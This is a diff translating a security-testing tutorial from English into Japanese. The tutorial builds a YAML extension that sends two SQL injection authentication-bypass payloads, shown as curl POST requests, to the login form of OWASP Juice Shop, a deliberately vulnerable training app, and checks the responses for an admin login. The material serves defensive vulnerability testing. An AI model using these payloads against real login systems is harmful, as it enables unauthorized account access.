@@ -1,5 +1,5 @@
-[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
-[link-send-headers]:        ../phase-send.md#working-with-the-host-header
+[link-meta-info]:           ../create-extension.md#meta-info-kaku-no-kozo
+[link-send-headers]:        ../phase-send.md#host-hedda-to-no-omoshiro
 [link-using-extension]:     ../using-extension.md
 [link-app-examination]:     app-examination.md
 
@@ -9,58 +9,54 @@
 [link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project
 
 
+#   変更を伴わないエクステンションの作成 
 
-#   Creation of Nonmodifying Extension
-
-The extension described in this document will not modify an incoming baseline request to inject some payload into. Instead, the two predefined test requests will be sent to the host that is specified in the baseline request. These test requests contain payloads that could lead to exploitation of the SQLi vulnerability in the [“OWASP Juice Shop”][link-juice-shop] target application's login form.
-
-
-##  Preparations
-
-It is highly recommended to [investigate the target application's behavior][link-app-examination] prior to creation of the FAST extension.
+この文書で述べているエクステンションは、ペイロードを注入するための入力基本リクエストを変更しません。代わりに、2つの事前定義されたテストリクエストが、基本リクエストで指定されたホストに送信されます。これらのテストリクエストには、[「OWASPジュースショップ」][link-juice-shop]のターゲットアプリケーションのログインフォームでのSQLi脆弱性を利用する可能性のあるペイロードが含まれています.
 
 
-##  Constructing the Extension
+##  準備
 
-Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and populate it with the required sections:
+FASTエクステンションの作成前に、ターゲットアプリケーションの動作を[調査することが強く推奨されます][link-app-examination]。
 
-1.  [**The `meta-info` section**][link-meta-info].
 
-    Prepare the description of the vulnerability that the extension will try to detect.
-    
-    * vulnerability header: `OWASP Juice Shop SQLi (non-mod extension)`
-    * vulnerability description: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
-    * vulnerability type: SQL injection
-    * vulnerability threat level: high
-    
-    The corresponding `meta-info` section should look as follows:
-    
+##  エクステンションの構築 
+
+エクステンションを記述するファイル（例えば `non-mod-extension.yaml`）を作成し、必要なセクションに情報を記入します。
+
+1.  [**`meta-info`セクション**][link-meta-info]。
+
+    エクステンションが検出しようとしている脆弱性の説明を準備します。
+
+    * 脆弱性ヘッダー: `OWASP Juice Shop SQLi (non-mod extension)`
+    * 脆弱性の説明: `OWASP Juice ShopでのSQLiのデモ（管理者ログイン）`
+    * 脆弱性タイプ: SQLインジェクション
+    * 脆弱性の脅威レベル: 高
+
+    それに応じた`meta-info`セクションは次のようになるはずです：
+
     ```
     meta-info:
       - type: sqli
       - threat: 80
       - title: 'OWASP Juice Shop SQLi (non-mod extension)'
-      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
+      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'
     ```
-    
-2.  **The `send` section, the [Send phase][doc-send-phase]**
+ 
+2.  **`send`セクション、[送信フェーズ][doc-send-phase]**
 
-    There are two payloads that should be sent as an `email` parameter value alongside any `password` value in order to exploit the SQL injection vulnerability in the target application:
+    ターゲットアプリケーションでのSQLインジェクション脆弱性を利用するためには、以下の2つのペイロードを`email`パラメータ値として任意の`password`値と一緒に送信する必要があります：
     
     * `'or 1=1 --`
     * `admin@juice-sh.op'--`
-    
-    You can craft two test requests, each containing
-    
-    * the `email` parameter with one of the values described above and 
-    * the `password` parameter with an arbitrary value.
 
-    It is sufficient to use just one of these requests to test our example target application (OWASP Juice Shop).
-    
-    However, having a set of several prepared test requests may be useful when conducting the security testing of a real application: if one of the requests can not exploit a vulnerability anymore thanks to updates and improvements in the application, then there will be other test requests available that may still exploit the vulnerability because of other payloads in use.
+    上記の値のうち1つを`email`パラメータと、任意の値を`password`パラメータとする形で2つのテストリクエストを作成することができます。
 
-    The request with the first payload from the list above is similar to this one:
-    
+    例の目標アプリケーション（OWASPジュースショップ）をテストするためには、これらのリクエストのうち1つを使用するだけで十分です。
+
+    しかし、実際のアプリケーションのセキュリティテストを行う際には、いくつかの準備済みのテストリクエストを持っていると便利かもしれません：1つのリクエストがもう脆弱性を利用できなくなっても、他のテストリクエストがまだ脆弱性を利用できるかもしれません。
+
+    先に挙げたペイロードリストの最初のペイロードを使用したリクエストは次のようなものになります：
+
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
          --header 'content-type: application/json' \
@@ -68,7 +64,7 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
          --data '{"email":"'\''or 1=1 --", "password":"12345"}'
     ```
 
-    The second request looks like the first one:
+    2つ目のリクエストは最初のリクエストと似ています：
 
     ```
     curl --request POST --url http://ojs.example.local/rest/user/login \
@@ -77,7 +73,7 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
          --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
     ```
 
-    Add the `send` section containing the descriptions of these two test requests:
+    これら2つのテストリクエストの説明を含む`send`セクションを追加します：
     
     ```
     send:
@@ -93,28 +89,28 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
         body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
     ``` 
     
-    !!! info "A note about the `Host` header" 
-        The `Host` header can be omitted in these requests because it does not influence the exploitation of this particular SQLi vulnerability. A FAST node will automatically add the `Host` header extracted from an incoming baseline requests.
+    !!! info "`Host`ヘッダーについての注意点"
+        この特定のSQLi脆弱性の利用には`Host`ヘッダーが影響を与えませんので、これらのリクエストでは`Host`ヘッダーを省略できます。FASTノードは、受信した基本リクエストから抽出した`Host`ヘッダーを自動的に追加します。
         
-        Read [here][link-send-headers] about how the Send phase handles request's headers.
+        送信フェーズがリクエストヘッダーをどのように扱うかについては[こちら][link-send-headers]で読むことができます。
 
-     3.  **The `detect` section, the [Detect phase][doc-detect-phase]**.
+    3.  **`detect`セクション、[検出フェーズ][doc-detect-phase]**。
+
+    以下の条件は、管理者権限でのユーザー認証が成功したことを示します：
     
-    The following conditions indicate that the user authentication with administrator's rights was successful:
-    
-    * The presence of the shopping cart identifier parameter with the `1` value in the response body. The parameter is in JSON format and should look like this:
-    
+    * レスポンス本体の中に、ショッピングカート識別子パラメータの`1`の値の存在。パラメータはJSON形式で、次のようになります：
+
         ```
         "bid":1
         ```
     
-    * The presence of the user email parameter with the `admin@juice-sh.op` value in the response body. The parameter is in JSON format and should look like this:
-    
+    * レスポンス本体の中に、ユーザーメールパラメータの`admin@juice-sh.op`の値の存在。パラメータはJSON形式で、次のようになります：
+
         ```
          "umail":"admin@juice-sh.op"
         ```
-    
-    Add the `detect` section that checks whether the attack was successful according to the conditions described above.
+
+    攻撃が成功したかどうかを、上記の条件に従って確認する`detect`セクションを追加します：
     
     ```
     detect:
@@ -122,13 +118,13 @@ Create a file that describes the extension (e.g., `non-mod-extension.yaml`) and 
         - body: "\"umail\":\"admin@juice-sh.op\""
         - body: "\"bid\":1"
     ```
-    
-!!! info "Escaping the special symbols"
-    Remember to escape the special symbols in the strings.
 
-##  Extension File
+!!! info "特殊文字のエスケープ"
+    文字列の中の特殊文字をエスケープすることを忘れないでください。
 
-Now the `non-mod-extension.yaml` file contains a complete set of the sections required for the extension to operate. The list of the file's contents is shown below:
+##  エクステンションファイル
+
+`non-mod-extension.yaml`ファイルには、エクステンションが動作するために必要なセクションの全セットが含まれています。ファイルの内容は以下の通りです：
 
 ??? info "non-mod-extension.yaml"
     ```
@@ -136,7 +132,7 @@ Now the `non-mod-extension.yaml` file contains a complete set of the sections re
       - type: sqli
       - threat: 80
       - title: 'OWASP Juice Shop SQLi (non-mod extension)'
-      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
+      - description: 'OWASP Juice ShopでのSQLiのデモ（管理者ログイン）'
 
     send:
       - method: 'POST'
@@ -156,6 +152,6 @@ Now the `non-mod-extension.yaml` file contains a complete set of the sections re
         - body: "\"bid\":1"
     ```
 
-##  Using Extension
+##  エクステンションの使用
 
-For detailed information about how to use the created expression, read [this document][link-using-extension].
+作成した表現の使用方法についての詳細情報は、[この文書][link-using-extension]を参照してください。
